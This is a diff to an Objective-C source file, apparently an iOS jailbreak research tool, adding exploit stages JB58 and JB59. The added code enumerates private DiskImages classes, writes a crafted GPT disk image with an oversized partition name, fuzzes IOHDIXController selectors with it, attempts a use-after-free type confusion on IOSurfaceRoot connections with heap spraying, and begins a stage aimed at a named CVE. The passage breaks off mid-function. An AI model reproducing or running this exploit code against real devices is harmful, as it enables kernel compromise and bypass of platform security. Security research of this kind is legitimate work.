@@ -18,6 +18,7 @@
 #import <stdatomic.h>
 #import <libkern/OSAtomic.h>
 #import <pthread.h>
+#import <objc/runtime.h>
 #import <sys/time.h>
 extern mach_port_t bootstrap_port;
 extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
@@ -42736,6 +42737,871 @@ void iosurface_gpt_leak(ISRLogBlock log, ISRDoneBlock done) {
         results[@"verdict"] = verdict;
         log([NSString stringWithFormat:@"JB57: Verdict: %@", verdict]);
         isr_checkpoint(@"JB57-gpt-leak-checkpoint.json", results);
+        done(results);
+    });
+}
+
+// MARK: - JB58: DiskImages Class Discovery + DASession GPT Mount + UAF Reclaim
+void iosurface_aggressive_exploit(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"=== Aggressive Exploitation ===");
+        log(@"JB58: === DiskImages ObjC Discovery + DASession Mount + UAF Type Confusion ===");
+
+        dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+        dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+        dlopen("/System/Library/PrivateFrameworks/MediaKit.framework/MediaKit", RTLD_NOW);
+
+        // ---- V1: ObjC class discovery ----
+        log(@"JB58: --- V1: ObjC class discovery ---");
+        int v1_found = 0;
+        const char *classNames[] = {
+            "DI2DiskImage", "DI2Controller", "DI2Manager", "DI2Session",
+            "DI2Backend", "DI2DiskImageController", "DI2Image", "DI2Disk",
+            "DI2AttachParams", "DI2DiskImageManager", "DI2ImageManager",
+            "DIDiskImage", "DIController", "DIManager", "DISession",
+            "DIBackingStore", "DIFileBackingStore", "DIURLBackingStore",
+            "DIAttachParams", "DIDiskImageManager", "DIImageController",
+            "DIDiskImageSession", "DIMainDiskImage", "DIDiskImageDevice",
+            "HDIXDiskImage", "HDIXController", "HDIXManager",
+            "HDIImage", "HDIController", "HDIDisk", "HDIAttachParams",
+            "MKMedia", "MKPartition", "MKDisk", "MKMediaSession",
+            "MKPartitionScheme", "MKDiskImage", "MKGPTPartitionScheme",
+            "IODiskImage", "IOHDIXDiskImage", "IODiskImageSession",
+            NULL
+        };
+        for (int i = 0; classNames[i] && !isr_stopped(); i++) {
+            Class cls = NSClassFromString([NSString stringWithUTF8String:classNames[i]]);
+            if (cls) {
+                v1_found++;
+                log([NSString stringWithFormat:@"JB58: V1 CLASS %s FOUND", classNames[i]]);
+                unsigned int mcount = 0;
+                Method *methods = class_copyMethodList(cls, &mcount);
+                int show = mcount > 25 ? 25 : mcount;
+                for (int j = 0; j < show; j++) {
+                    log([NSString stringWithFormat:@"JB58: V1   -[%d] %@",
+                         j, NSStringFromSelector(method_getName(methods[j]))]);
+                }
+                if (methods) free(methods);
+                unsigned int ccount = 0;
+                Method *cmethods = class_copyMethodList(object_getClass(cls), &ccount);
+                int cshow = ccount > 15 ? 15 : ccount;
+                for (int j = 0; j < cshow; j++) {
+                    log([NSString stringWithFormat:@"JB58: V1   +[%d] %@",
+                         j, NSStringFromSelector(method_getName(cmethods[j]))]);
+                }
+                if (cmethods) free(cmethods);
+                log([NSString stringWithFormat:@"JB58: V1   instance=%u class=%u", mcount, ccount]);
+            }
+        }
+        results[@"v1_classes"] = @(v1_found);
+        log([NSString stringWithFormat:@"JB58: V1 total=%d", v1_found]);
+
+        // ---- V2: Extended C symbol probe ----
+        if (!isr_stopped()) {
+            log(@"JB58: --- V2: Extended symbol probe ---");
+            int v2_found = 0;
+            const char *syms[] = {
+                "DI2AttachCreate", "DI2AttachURL", "DI2SessionCreate",
+                "DI2DiskCreate", "DI2DiskImageCreate", "DI2Mount",
+                "DIMainCreate", "DI_attach_image", "DI_mount_image",
+                "HDIAttach", "HDIOpen", "HDICreate", "HDIMount",
+                "HDIAttachImage", "HDICreateDiskImage", "HDIMountDiskImage",
+                "hdi_attach", "hdi_open", "hdi_create", "hdi_mount",
+                "di_attach", "di_open", "di_create", "di_mount",
+                "_DIAttachParamsCreate", "_DIMainCreateWithURL",
+                "_DI2AttachWithURL", "_DI2CreateFromURL",
+                "DiskImageAttach", "DiskImageMount",
+                "MKMediaAttach", "MKMediaCreate", "MKPartitionProbe",
+                NULL
+            };
+            for (int si = 0; syms[si]; si++) {
+                void *sp = dlsym(RTLD_DEFAULT, syms[si]);
+                if (sp) {
+                    log([NSString stringWithFormat:@"JB58: V2 FOUND %s = %p", syms[si], sp]);
+                    v2_found++;
+                }
+            }
+            results[@"v2_symbols"] = @(v2_found);
+        }
+
+        // ---- V3: Binary check ----
+        if (!isr_stopped()) {
+            log(@"JB58: --- V3: Binary check ---");
+            const char *bins[] = {
+                "/usr/bin/hdiutil", "/usr/sbin/hdik", "/usr/bin/hdik",
+                "/usr/sbin/hdiutil", "/usr/libexec/hdik",
+                "/usr/bin/diskutil", "/usr/sbin/diskutil",
+                "/sbin/mount", "/usr/bin/mount",
+                "/sbin/mount_hfs", "/sbin/mount_apfs",
+                NULL
+            };
+            for (int i = 0; bins[i]; i++) {
+                if (access(bins[i], F_OK) == 0) {
+                    int exe = access(bins[i], X_OK) == 0;
+                    log([NSString stringWithFormat:@"JB58: V3 %s EXISTS exec=%d", bins[i], exe]);
+                }
+            }
+        }
+
+        // ---- V4: DASession + DADisk probe on existing disks ----
+        int v4_disks = 0;
+        if (!isr_stopped()) {
+            log(@"JB58: --- V4: DASession disk probe ---");
+            void *di2h = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+            if (di2h) {
+                typedef void*(*da_sess_fn)(void*);
+                typedef void*(*da_bsd_fn)(void*, void*, const char*);
+                typedef void*(*da_desc_fn)(void*);
+                typedef void(*cfrel_fn)(void*);
+
+                da_sess_fn da_sess = (da_sess_fn)dlsym(di2h, "DASessionCreate");
+                da_bsd_fn da_bsd = (da_bsd_fn)dlsym(di2h, "DADiskCreateFromBSDName");
+                da_desc_fn da_desc = (da_desc_fn)dlsym(di2h, "DADiskCopyDescription");
+                cfrel_fn sym_cfrel = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+                if (da_sess && da_bsd) {
+                    void *sess = da_sess(NULL);
+                    log([NSString stringWithFormat:@"JB58: V4 session=%p", sess]);
+
+                    if (sess) {
+                        for (int d = 0; d <= 15 && !isr_stopped(); d++) {
+                            char bsd[32];
+                            snprintf(bsd, sizeof(bsd), "disk%d", d);
+                            void *disk = da_bsd(NULL, sess, bsd);
+                            if (disk) {
+                                v4_disks++;
+                                log([NSString stringWithFormat:@"JB58: V4 %s = %p", bsd, disk]);
+                                if (da_desc) {
+                                    void *desc = da_desc(disk);
+                                    if (desc) {
+                                        NSDictionary *dd = (__bridge_transfer NSDictionary*)desc;
+                                        for (NSString *key in [dd allKeys]) {
+                                            id val = [dd objectForKey:key];
+                                            log([NSString stringWithFormat:@"JB58: V4   %@ = %@", key, val]);
+                                        }
+                                    }
+                                }
+                                if (sym_cfrel) sym_cfrel(disk);
+                            }
+                        }
+                        // Also try disk image partitions (diskNsN)
+                        for (int d = 0; d <= 5 && !isr_stopped(); d++) {
+                            for (int s = 0; s <= 4; s++) {
+                                char bsd[32];
+                                snprintf(bsd, sizeof(bsd), "disk%ds%d", d, s);
+                                void *disk = da_bsd(NULL, sess, bsd);
+                                if (disk) {
+                                    v4_disks++;
+                                    log([NSString stringWithFormat:@"JB58: V4 %s = %p", bsd, disk]);
+                                    if (da_desc) {
+                                        void *desc = da_desc(disk);
+                                        if (desc) {
+                                            NSDictionary *dd = (__bridge_transfer NSDictionary*)desc;
+                                            NSString *name = [dd objectForKey:@"DAMediaName"];
+                                            NSString *content = [dd objectForKey:@"DAMediaContent"];
+                                            NSNumber *sz = [dd objectForKey:@"DAMediaSize"];
+                                            log([NSString stringWithFormat:@"JB58: V4   name=%@ content=%@ size=%@",
+                                                 name ?: @"nil", content ?: @"nil", sz ?: @"nil"]);
+                                        }
+                                    }
+                                    if (sym_cfrel) sym_cfrel(disk);
+                                }
+                            }
+                        }
+                        if (sym_cfrel) sym_cfrel(sess);
+                    }
+                }
+            }
+        }
+        results[@"v4_disks"] = @(v4_disks);
+
+        // ---- V5: GPT image creation + DADiskMount attempt ----
+        int v5_mounted = 0;
+        if (!isr_stopped()) {
+            log(@"JB58: --- V5: GPT mount via DiskImages2 ---");
+            typedef unsigned long(*crc32_fn)(unsigned long, const unsigned char*, unsigned int);
+            crc32_fn zcrc32 = (crc32_fn)dlsym(RTLD_DEFAULT, "crc32");
+
+            if (zcrc32) {
+                uint32_t sec_sz = 512;
+                uint32_t total_sec = 8192;
+                uint32_t img_sz = sec_sz * total_sec;
+                uint32_t nent = 8;
+                uint32_t entsz = 128;
+                uint32_t ent_sectors = (nent * entsz + sec_sz - 1) / sec_sz;
+                uint64_t first_usable = 2 + ent_sectors;
+                uint64_t last_usable = total_sec - 2 - ent_sectors;
+
+                uint8_t *img = calloc(1, img_sz);
+                if (img) {
+                    img[446 + 4] = 0xEE;
+                    img[446 + 8] = 1;
+                    uint32_t mbrsz = total_sec - 1;
+                    memcpy(img + 446 + 12, &mbrsz, 4);
+                    img[510] = 0x55; img[511] = 0xAA;
+
+                    uint8_t *h = img + sec_sz;
+                    memcpy(h, "EFI PART", 8);
+                    uint32_t tmp32; uint64_t tmp64;
+                    tmp32 = 0x00010000; memcpy(h + 8, &tmp32, 4);
+                    tmp32 = 92; memcpy(h + 12, &tmp32, 4);
+                    tmp64 = 1; memcpy(h + 24, &tmp64, 8);
+                    tmp64 = total_sec - 1; memcpy(h + 32, &tmp64, 8);
+                    tmp64 = first_usable; memcpy(h + 40, &tmp64, 8);
+                    tmp64 = last_usable; memcpy(h + 48, &tmp64, 8);
+                    arc4random_buf(h + 56, 16);
+                    tmp64 = 2; memcpy(h + 72, &tmp64, 8);
+                    tmp32 = nent; memcpy(h + 80, &tmp32, 4);
+                    tmp32 = entsz; memcpy(h + 84, &tmp32, 4);
+
+                    uint8_t *entries = img + 2 * sec_sz;
+                    uint8_t *e = entries + 7 * entsz;
+                    uint8_t type_guid[16] = {0xA2,0xA0,0xD0,0xEB,0xE5,0xB9,0x33,0x44,
+                                             0x87,0xC0,0x68,0xB6,0xB7,0x26,0x99,0xC7};
+                    memcpy(e, type_guid, 16);
+                    arc4random_buf(e + 16, 16);
+                    memcpy(e + 32, &first_usable, 8);
+                    memcpy(e + 40, &last_usable, 8);
+                    for (int i = 0; i < 36; i++) {
+                        e[56 + i * 2] = 'A' + (i % 26);
+                        e[56 + i * 2 + 1] = 0;
+                    }
+
+                    uint32_t ecrc = (uint32_t)zcrc32(0, entries, nent * entsz);
+                    memcpy(h + 88, &ecrc, 4);
+                    memset(h + 16, 0, 4);
+                    uint32_t hcrc = (uint32_t)zcrc32(0, h, 92);
+                    memcpy(h + 16, &hcrc, 4);
+
+                    uint64_t bk_ent_start = total_sec - 1 - ent_sectors;
+                    memcpy(img + bk_ent_start * sec_sz, entries, nent * entsz);
+                    uint8_t *bh = img + (total_sec - 1) * sec_sz;
+                    memcpy(bh, h, 92);
+                    tmp64 = total_sec - 1; memcpy(bh + 24, &tmp64, 8);
+                    tmp64 = 1; memcpy(bh + 32, &tmp64, 8);
+                    memcpy(bh + 72, &bk_ent_start, 8);
+                    memset(bh + 16, 0, 4);
+                    uint32_t bhcrc = (uint32_t)zcrc32(0, bh, 92);
+                    memcpy(bh + 16, &bhcrc, 4);
+
+                    NSString *imgPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"gpt_exploit.img"];
+                    NSData *imgData = [NSData dataWithBytesNoCopy:img length:img_sz freeWhenDone:NO];
+                    BOOL wrote = [imgData writeToFile:imgPath atomically:YES];
+                    log([NSString stringWithFormat:@"JB58: V5 image=%d path=%@", wrote, imgPath]);
+
+                    if (wrote) {
+                        void *di2h = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+                        if (di2h) {
+                            typedef void*(*da_sess_fn)(void*);
+                            typedef void*(*da_mount_fn)(void*, void*, void*, void*, void*);
+                            typedef void*(*da_mount_args_fn)(void*, void*, void*, void*, void*, void*);
+                            da_sess_fn da_sess = (da_sess_fn)dlsym(di2h, "DASessionCreate");
+                            da_mount_args_fn da_mwa = (da_mount_args_fn)dlsym(di2h, "DADiskMountWithArguments");
+
+                            typedef void*(*hdi_fn)(void*, int, void*);
+                            hdi_fn hdi_attach_sym = NULL;
+                            const char *hdiSyms[] = {
+                                "HDIAttach", "hdi_attach", "HDICreateDiskImage",
+                                "DI2AttachCreate", "DIAttach", NULL
+                            };
+                            for (int i = 0; hdiSyms[i]; i++) {
+                                hdi_fn f = (hdi_fn)dlsym(RTLD_DEFAULT, hdiSyms[i]);
+                                if (f) {
+                                    hdi_attach_sym = f;
+                                    log([NSString stringWithFormat:@"JB58: V5 attach_fn=%s %p", hdiSyms[i], f]);
+                                    break;
+                                }
+                            }
+
+                            if (hdi_attach_sym) {
+                                log(@"JB58: V5 trying hdi attach...");
+                                @try {
+                                    void *r = hdi_attach_sym((__bridge void*)[NSURL fileURLWithPath:imgPath], 0, NULL);
+                                    log([NSString stringWithFormat:@"JB58: V5 attach result=%p", r]);
+                                    if (r) v5_mounted = 1;
+                                } @catch (NSException *ex) {
+                                    log([NSString stringWithFormat:@"JB58: V5 attach exception: %@", ex.reason]);
+                                }
+                            }
+
+                            if (!v5_mounted && da_sess) {
+                                log(@"JB58: V5 trying IOKit direct attach via IOHDIXController sel0-3...");
+                                typedef void*(*matching_fn)(const char*);
+                                typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+                                typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+                                typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t,
+                                                             const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+                                typedef void(*objrelease_fn)(unsigned int);
+                                typedef int(*svcclose_fn)(unsigned int);
+
+                                matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+                                getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+                                svcopen_fn sym_sopen = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+                                callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+                                objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+                                svcclose_fn sym_sclose = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+
+                                if (sym_matching && sym_getmatch && sym_sopen && sym_call) {
+                                    NSData *rawData = [NSData dataWithContentsOfFile:imgPath];
+                                    if (rawData) {
+                                        unsigned int hdix_svc = sym_getmatch(0, sym_matching("IOHDIXController"));
+                                        if (hdix_svc) {
+                                            for (unsigned int ct = 0; ct <= 10 && !v5_mounted && !isr_stopped(); ct++) {
+                                                unsigned int hc = 0;
+                                                int okr = sym_sopen(hdix_svc, mach_task_self(), ct, &hc);
+                                                if (okr == 0 && hc) {
+                                                    for (uint32_t sel = 0; sel <= 5 && !isr_stopped(); sel++) {
+                                                        uint64_t sout[8] = {0};
+                                                        uint32_t soutCnt = 8;
+                                                        uint8_t soBuf[256] = {0};
+                                                        size_t soSz = 256;
+                                                        int r = sym_call(hc, sel, NULL, 0,
+                                                                         [rawData bytes], [rawData length],
+                                                                         sout, &soutCnt, soBuf, &soSz);
+                                                        if (r != (int)0xe00002c2 && r != (int)0xe00002bc) {
+                                                            log([NSString stringWithFormat:@"JB58: V5 type=%u sel=%u r=0x%x outCnt=%u soSz=%zu",
+                                                                 ct, sel, (unsigned)r, soutCnt, soSz]);
+                                                            if (r == 0) v5_mounted = 1;
+                                                        }
+                                                    }
+                                                    sym_sclose(hc);
+                                                }
+                                            }
+                                            sym_release(hdix_svc);
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        [[NSFileManager defaultManager] removeItemAtPath:imgPath error:nil];
+                    }
+                    free(img);
+                }
+            }
+        }
+        results[@"v5_mounted"] = @(v5_mounted);
+
+        // ---- V6: UAF + cross-connection type confusion ----
+        int v6_confused = 0;
+        if (!isr_stopped()) {
+            log(@"JB58: --- V6: UAF type confusion ---");
+            typedef void*(*matching_fn)(const char*);
+            typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+            typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+            typedef int(*svcclose_fn)(unsigned int);
+            typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t,
+                                        const uint64_t*, uint32_t, const void*, size_t, void*,
+                                        uint32_t*, uint64_t*, uint32_t*);
+            typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t,
+                                         const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+            typedef void(*objrelease_fn)(unsigned int);
+            typedef void*(*iosurface_create_fn)(void*);
+            typedef uint32_t(*iosurface_getid_fn)(void*);
+
+            matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+            getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+            svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+            svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+            callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+            callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+            objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+            iosurface_create_fn sym_create = (iosurface_create_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+            iosurface_getid_fn sym_getid = (iosurface_getid_fn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+
+            typedef unsigned int(*alloc_fn)(unsigned int, int, unsigned int*);
+            typedef int(*insert_fn)(unsigned int, unsigned int, unsigned int, int);
+            alloc_fn sym_alloc = (alloc_fn)dlsym(RTLD_DEFAULT, "mach_port_allocate");
+            insert_fn sym_insert = (insert_fn)dlsym(RTLD_DEFAULT, "mach_port_insert_right");
+
+            if (sym_matching && sym_getmatch && sym_open && sym_close &&
+                sym_async && sym_call && sym_create && sym_getid) {
+                NSDictionary *propsA = @{@"IOSurfaceWidth": @(32), @"IOSurfaceHeight": @(32),
+                    @"IOSurfaceBytesPerElement": @(4), @"IOSurfaceAllocSize": @(4096)};
+                NSDictionary *propsB = @{@"IOSurfaceWidth": @(64), @"IOSurfaceHeight": @(64),
+                    @"IOSurfaceBytesPerElement": @(4), @"IOSurfaceAllocSize": @(16384)};
+                void *surfA = sym_create((__bridge void*)propsA);
+                void *surfB = sym_create((__bridge void*)propsB);
+                uint32_t idA = surfA ? sym_getid(surfA) : 0;
+                uint32_t idB = surfB ? sym_getid(surfB) : 0;
+                log([NSString stringWithFormat:@"JB58: V6 surfA=%u surfB=%u", idA, idB]);
+
+                unsigned int svc = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
+                unsigned int conn1 = 0, conn2 = 0;
+                int ok1 = svc ? sym_open(svc, mach_task_self(), 0, &conn1) : -1;
+                unsigned int svc2 = sym_getmatch(0, sym_matching("IOSurfaceRoot"));
+                int ok2 = svc2 ? sym_open(svc2, mach_task_self(), 0, &conn2) : -1;
+                if (svc) sym_release(svc);
+                if (svc2) sym_release(svc2);
+
+                unsigned int wp = 0;
+                if (sym_alloc && sym_insert) {
+                    sym_alloc(mach_task_self(), 1, &wp);
+                    sym_insert(mach_task_self(), wp, wp, 20);
+                }
+
+                if (ok1 == 0 && ok2 == 0 && conn1 && conn2 && wp && idA && idB) {
+                    log([NSString stringWithFormat:@"JB58: V6 conn1=%u conn2=%u", conn1, conn2]);
+
+                    for (int trial = 0; trial < 5 && !isr_stopped(); trial++) {
+                        uint64_t regA[3] = {idA, 0, 0};
+                        uint64_t regB[3] = {idB, 0, 0};
+
+                        int r1 = jb41_callSel(conn1, 17, regA, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                        int d1 = jb41_callSel(conn1, 18, regA, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+
+                        int r2 = jb41_callSel(conn2, 17, regB, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                        int dup1 = jb41_callSel(conn1, 17, regA, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+
+                        int d2_a = jb41_callSel(conn1, 18, regA, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+                        int d2_b = jb41_callSel(conn2, 18, regB, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+
+                        log([NSString stringWithFormat:@"JB58: V6 t=%d regA=0x%x deregA=0x%x regB=0x%x dupA=0x%x deregA2=0x%x deregB=0x%x",
+                             trial, (unsigned)r1, (unsigned)d1, (unsigned)r2, (unsigned)dup1, (unsigned)d2_a, (unsigned)d2_b]);
+
+                        if (d2_b != 0) {
+                            v6_confused++;
+                            log([NSString stringWithFormat:@"JB58: V6 TYPE CONFUSION! deregB=0x%x", (unsigned)d2_b]);
+                        }
+                    }
+
+                    // V6b: Try IOConnectSetCFProperties after UAF
+                    log(@"JB58: V6b: CFProperties on stale connection");
+                    typedef int(*setprops_fn)(unsigned int, void*);
+                    setprops_fn sym_setprops = (setprops_fn)dlsym(RTLD_DEFAULT, "IOConnectSetCFProperties");
+                    if (sym_setprops) {
+                        uint64_t regA[3] = {idA, 0, 0};
+                        jb41_callSel(conn1, 17, regA, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                        jb41_callSel(conn1, 18, regA, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+
+                        for (int sz = 16; sz <= 32; sz += 8) {
+                            NSMutableData *payload = [NSMutableData dataWithLength:sz];
+                            memset([payload mutableBytes], 0x41, sz);
+                            NSDictionary *d = @{@"k": payload};
+                            int r = sym_setprops(conn1, (__bridge void*)d);
+                            log([NSString stringWithFormat:@"JB58: V6b cfprops sz=%d r=0x%x", sz, (unsigned)r]);
+                        }
+
+                        int dup = jb41_callSel(conn1, 17, regA, 24, 1, wp, (void*)sym_call, (void*)sym_async);
+                        log([NSString stringWithFormat:@"JB58: V6b post-spray dup=0x%x", (unsigned)dup]);
+                        jb41_callSel(conn1, 18, regA, 24, 0, wp, (void*)sym_call, (void*)sym_async);
+                    }
+
+                    sym_close(conn1);
+                    sym_close(conn2);
+                }
+            }
+        }
+        results[@"v6_confused"] = @(v6_confused);
+
+        // Verdict
+        NSString *verdict = @"PROBED";
+        if (v5_mounted) {
+            verdict = @"GPT_MOUNTED";
+        } else if (v6_confused > 0) {
+            verdict = @"TYPE_CONFUSION";
+        } else if (v1_found > 0) {
+            verdict = @"CLASSES_FOUND";
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB58: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB58-aggressive-exploit-checkpoint.json", results);
+        done(results);
+    });
+}
+
+#pragma mark - JB59: CVE-2026-112554 GPT Mount via DIAttachParams
+
+void iosurface_gpt_mount(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB59: === CVE-2026-112554 — GPT Mount via DIAttachParams ===");
+
+        void *hDI = dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+        void *hDI2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+        log([NSString stringWithFormat:@"JB59: DiskImages=%p DiskImages2=%p", hDI, hDI2]);
+
+        typedef id(*msgsend_fn)(id, SEL, ...);
+        msgsend_fn msg = (msgsend_fn)dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        typedef void*(*matching_fn)(const char*);
+        typedef int(*getsvcs_fn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*iternext_fn)(unsigned int);
+        typedef int(*regname_fn)(unsigned int, char*);
+        typedef void(*objrelease_fn)(unsigned int);
+        typedef int(*regentry_prop_fn)(unsigned int, const char*, void*, uint32_t*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getsvcs_fn sym_getsvcs = (getsvcs_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        iternext_fn sym_next = (iternext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        regname_fn sym_regname = (regname_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetName");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        regentry_prop_fn sym_getprop = (regentry_prop_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetProperty");
+        typedef unsigned long(*crc32_fn)(unsigned long, const unsigned char*, unsigned int);
+        crc32_fn zcrc32 = (crc32_fn)dlsym(RTLD_DEFAULT, "crc32");
+
+        if (!msg || !sym_matching || !sym_getsvcs || !sym_next || !sym_regname || !sym_release || !zcrc32) {
+            log(@"JB59: missing symbols");
+            results[@"verdict"] = @"NO_SYMBOLS";
+            done(results);
+            return;
+        }
+
+        // W1: Snapshot existing IOMedia before mount
+        log(@"JB59: --- W1: Pre-mount IOMedia snapshot ---");
+        NSMutableSet *preMedia = [NSMutableSet set];
+        {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                while ((svc = sym_next(iter)) != 0) {
+                    char nm[256] = {0};
+                    sym_regname(svc, nm);
+                    [preMedia addObject:[NSString stringWithUTF8String:nm]];
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        log([NSString stringWithFormat:@"JB59: W1 pre-mount media count=%lu", (unsigned long)preMedia.count]);
+        results[@"w1_pre_count"] = @(preMedia.count);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W2: Create GPT image with crafted partition name (36 non-NUL UTF-16LE chars)
+        log(@"JB59: --- W2: GPT image creation ---");
+        uint32_t sec_sz = 512;
+        uint32_t total_sec = 8192;
+        uint32_t img_sz = sec_sz * total_sec;
+        uint32_t nent = 8;
+        uint32_t entsz = 128;
+        uint32_t ent_sectors = (nent * entsz + sec_sz - 1) / sec_sz;
+        uint64_t first_usable = 2 + ent_sectors;
+        uint64_t last_usable = total_sec - 2 - ent_sectors;
+
+        uint8_t *img = (uint8_t *)calloc(1, img_sz);
+        NSString *imgPath = nil;
+
+        if (img) {
+            img[446 + 4] = 0xEE;
+            img[446 + 8] = 1;
+            uint32_t mbrsz = total_sec - 1;
+            memcpy(img + 446 + 12, &mbrsz, 4);
+            img[510] = 0x55; img[511] = 0xAA;
+
+            uint8_t *h = img + sec_sz;
+            memcpy(h, "EFI PART", 8);
+            uint32_t tmp32; uint64_t tmp64;
+            tmp32 = 0x00010000; memcpy(h + 8, &tmp32, 4);
+            tmp32 = 92; memcpy(h + 12, &tmp32, 4);
+            tmp64 = 1; memcpy(h + 24, &tmp64, 8);
+            tmp64 = total_sec - 1; memcpy(h + 32, &tmp64, 8);
+            tmp64 = first_usable; memcpy(h + 40, &tmp64, 8);
+            tmp64 = last_usable; memcpy(h + 48, &tmp64, 8);
+            arc4random_buf(h + 56, 16);
+            tmp64 = 2; memcpy(h + 72, &tmp64, 8);
+            tmp32 = nent; memcpy(h + 80, &tmp32, 4);
+            tmp32 = entsz; memcpy(h + 84, &tmp32, 4);
+
+            uint8_t *entries = img + 2 * sec_sz;
+            uint8_t type_guid[16] = {0xA2,0xA0,0xD0,0xEB,0xE5,0xB9,0x33,0x44,
+                                     0x87,0xC0,0x68,0xB6,0xB7,0x26,0x99,0xC7};
+            for (int p = 0; p < (int)nent; p++) {
+                uint8_t *e = entries + p * entsz;
+                memcpy(e, type_guid, 16);
+                arc4random_buf(e + 16, 16);
+                uint64_t pstart = first_usable + (uint64_t)p;
+                uint64_t pend = pstart;
+                memcpy(e + 32, &pstart, 8);
+                memcpy(e + 40, &pend, 8);
+                if (p < 7) {
+                    for (int i = 0; i < 8; i++) {
+                        e[56 + i * 2] = 'P';
+                        e[56 + i * 2 + 1] = 0;
+                    }
+                } else {
+                    for (int i = 0; i < 36; i++) {
+                        e[56 + i * 2] = (uint8_t)('A' + (i % 26));
+                        e[56 + i * 2 + 1] = 0;
+                    }
+                }
+            }
+
+            uint32_t ecrc = (uint32_t)zcrc32(0, entries, nent * entsz);
+            memcpy(h + 88, &ecrc, 4);
+            memset(h + 16, 0, 4);
+            uint32_t hcrc = (uint32_t)zcrc32(0, h, 92);
+            memcpy(h + 16, &hcrc, 4);
+
+            uint64_t bk_ent_start = total_sec - 1 - ent_sectors;
+            memcpy(img + bk_ent_start * sec_sz, entries, nent * entsz);
+            uint8_t *bh = img + (total_sec - 1) * sec_sz;
+            memcpy(bh, h, 92);
+            tmp64 = total_sec - 1; memcpy(bh + 24, &tmp64, 8);
+            tmp64 = 1; memcpy(bh + 32, &tmp64, 8);
+            memcpy(bh + 72, &bk_ent_start, 8);
+            memset(bh + 16, 0, 4);
+            uint32_t bhcrc = (uint32_t)zcrc32(0, bh, 92);
+            memcpy(bh + 16, &bhcrc, 4);
+
+            imgPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb59_gpt.img"];
